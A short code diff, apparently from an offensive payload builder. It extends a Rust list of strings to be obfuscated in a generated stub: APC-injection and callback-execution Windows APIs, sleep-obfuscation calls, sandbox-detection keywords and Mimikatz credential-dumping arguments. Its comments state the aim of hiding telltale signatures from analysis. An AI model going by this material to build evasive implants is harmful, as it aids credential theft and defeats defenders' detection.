@@ -38,10 +38,19 @@ pub const SENSITIVE_LITERALS: &[&str] = &[
     "NtSuspendThread",
     "NtQueryInformationProcess",
     "NtGetContextThread",
+    "NtQueueApcThread",
     // Sleep obfuscation (ekko): resolved dynamically, must stay obfuscated.
     "SystemFunction032",
     "RtlCaptureContext",
     "NtContinue",
+    // Callback execution: the enumeration entry point and its module are
+    // resolved dynamically, so neither may appear in cleartext.
+    "crypt32.dll",
+    "CertEnumSystemStore",
+    "EnumDesktopsW",
+    "EnumSystemLocalesA",
+    "EnumChildWindows",
+    "CryptEnumOIDInfo",
     // Bouncer: analysis-environment indicators, reconstructed at runtime.
     // `test` is deliberately absent: it is too short to be a meaningful signal
     // and would match unrelated strings.
@@ -55,7 +64,7 @@ pub const SENSITIVE_LITERALS: &[&str] = &[
     "sandbox",
     "malware",
     "analysis",
-    // Mimikatz-style runtime arguments: a YAML `build.payload.args` literal is a
+    // Mimikatz-style runtime arguments: a YAML `build.payloads.<name>.args` literal is a
     // telltale signature, so it must reach the stub through `StringsConfig`.
     "sekurlsa::logonpasswords",
     "privilege::debug",
